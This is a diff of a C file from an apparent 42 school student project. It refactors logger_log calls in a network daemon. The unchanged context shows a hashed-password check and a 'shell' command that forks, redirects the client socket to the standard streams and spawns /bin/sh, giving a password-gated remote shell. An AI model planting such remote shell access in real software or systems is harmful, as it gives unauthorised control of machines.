@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:28:48 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/02 21:49:52 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/03 00:39:32 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,13 +19,13 @@ static int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
 		int hashed_msg = hash_str(msg);
 		if (hashed_msg == PASSWORD)
 		{
-			logger_log(ctx, LOG_LOG, "Client %d correct password (%d)", client->id, hashed_msg);
+			logger_log(LOG_LOG, "Client %d correct password (%d)", client->id, hashed_msg);
 			server_send_to_id(&ctx->server, client->id, CORRECT_PASSWORD_TEXT);
 			server_send_to_fd(client->fd, PROMPT);
 			client->logged = true;
 			return (0);
 		}
-		logger_log(ctx, LOG_LOG, "Client %d wrong password (%d)", client->id, hashed_msg);
+		logger_log(LOG_LOG, "Client %d wrong password (%d)", client->id, hashed_msg);
 		server_send_to_id(&ctx->server, client->id, INCORRECT_PASSWORD_TEXT);
 		return (0);
 	}
@@ -34,7 +34,7 @@ static int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
 
 static void	start_remote_shell(t_ctx *ctx, t_client *client)
 {
-	logger_log(ctx, LOG_LOG, "Client %d shell command entered", client->id);
+	logger_log(LOG_LOG, "Client %d shell command entered", client->id);
 	server_send_to_id(&ctx->server, client->id, RVRS_SHELL_TEXT);
 
 	client->shell_pid = fork();
@@ -46,7 +46,7 @@ static void	start_remote_shell(t_ctx *ctx, t_client *client)
 		dup2(client->fd, STDERR_FILENO);
 		dup2(client->fd, STDIN_FILENO);
 
-		logger_log(ctx, LOG_INFO, "Sucessfully forked, spawning shell");
+		logger_log(LOG_INFO, "Sucessfully forked, spawning shell");
 		ctx_delete(ctx, false);
 
 		char	*argv[] = {"/bin/sh", NULL};
@@ -114,7 +114,7 @@ void	message_hook(t_client *client, char *msg, void *ptr)
 	if (!check_client_password(ctx, client, msg))
 		return ;
 
-	logger_log(ctx, LOG_LOG, "From %d: %s", client->id, msg);
+	logger_log(LOG_LOG, "From %d: %s", client->id, msg);
 
 	if (!strcmp(msg, "shell"))
 	{
@@ -123,18 +123,18 @@ void	message_hook(t_client *client, char *msg, void *ptr)
 	}
 	else if (!strcmp(msg, "help"))
 	{
-		logger_log(ctx, LOG_LOG, "Client %d help command entered", client->id);
+		logger_log(LOG_LOG, "Client %d help command entered", client->id);
 		server_send_to_id(&ctx->server, client->id, HELP_TEXT);
 	}
 	else if (!strcmp(msg, "quit"))
 	{
-		logger_log(ctx, LOG_LOG, "Client %d quit command entered", client->id);
+		logger_log(LOG_LOG, "Client %d quit command entered", client->id);
 		ctx->running = false;
 		return ;
 	}
 	else if (!strcmp(msg, "stats"))
 	{
-		logger_log(ctx, LOG_LOG, "Client %d stats command entered", client->id);
+		logger_log(LOG_LOG, "Client %d stats command entered", client->id);
 		get_stats(ctx, client);
 	}
 	else
@@ -148,12 +148,11 @@ void	connect_hook(t_client *client, void *ptr)
 
 	server_send_to_id(&ctx->server, client->id, WELCOME_TEXT);
 	server_send_to_id(&ctx->server, client->id, PASSWORD_PROMPT_TEXT);
-	logger_log(ctx, LOG_INFO, "Client %d joined", client->id);
+	logger_log(LOG_INFO, "Client %d joined", client->id);
 }
 
 void	disconnect_hook(t_client *client, void *ptr)
 {
-	t_ctx	*ctx = ptr;
-
-	logger_log(ctx, LOG_INFO, "Client %d left", client->id);
+	(void)ptr;
+	logger_log(LOG_INFO, "Client %d left", client->id);
 }
